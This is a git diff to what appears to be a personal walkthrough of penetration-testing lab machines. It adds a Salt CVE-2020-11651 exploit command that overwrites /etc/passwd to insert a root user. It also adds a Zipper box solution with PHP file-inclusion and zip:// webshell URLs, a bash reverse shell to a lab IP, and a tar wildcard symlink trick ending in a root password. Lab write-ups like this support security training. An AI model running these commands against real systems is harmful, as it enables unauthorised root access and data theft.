@@ -48,6 +48,38 @@ Nmap done: 1 IP address (1 host up) scanned in 24.04 seconds
 2. ZeroMQ ZMTP 2.0 vulnerable with exploit, it's github and exploit db exploits are not broken. 
 
 3. Basically, we have to add new root user and ssh login with it. 
+```
+https://github.com/jasperla/CVE-2020-11651-poc/blob/master/README.md
+
+python3 exploit.py --master 192.168.187.62 --upload-src newroot --upload-dest ../../../../etc/passwd
+
+newroot
+
+ram:$1$96Q5Pntb$7h9hNPxRmiDbPbXYXTJ7w0:0:0:root:/root:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+mezz:x:997:995::/home/mezz:/bin/false
+nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
+named:x:25:25:Named:/var/named:/sbin/nologin
+
+```
 
 ## Exfiltrated
 
@@ -654,7 +686,7 @@ root@boolean:~# cat proof.txt
 ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true
 ```
 ## Clue 
-
+It requires SMB port to be open for solving, but this machine do not have smb port open. 
 
 ## Cockpit
 1. Rustscan 
@@ -1949,7 +1981,45 @@ cat proof.txt
 
 ## Zipper
 
+All in one 
+```
+┌──(kali㉿kali)-[~]
+└─$ nmap 192.168.120.119 -sC -sV
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 03:01 MST
+Nmap scan report for 192.168.120.119
+Host is up (0.12s latency).
 
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
+|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
+|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
+80/tcp  open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Zipper
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+873/tcp open  rsync
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+/index.php?file=home
 
+http://192.168.109.128/index.php?file=php://filter/convert.base64-encode/resource=index
+
+http://192.168.109.128/uploads/upload_1627661999.zip
+
+http://192.168.109.128/index.php?file=zip://uploads/upload_1627661999.zip%23exploit&cmd=whoami
+
+bash -c 'bash -i >& /dev/tcp/192.168.118.4/443 0>&1'
+
+cat /etc/crontab
+
+www-data@zipper:/var/www/html/uploads$ ln -s /root/secret enox.zip
+
+www-data@zipper:/var/www/html/uploads$ touch @enox.zip
+
+www-data@zipper:/opt/backups$ cat backup.log
+
+ssh root@192.168.120.119  
+WildCardsGoingWild 
+```
 
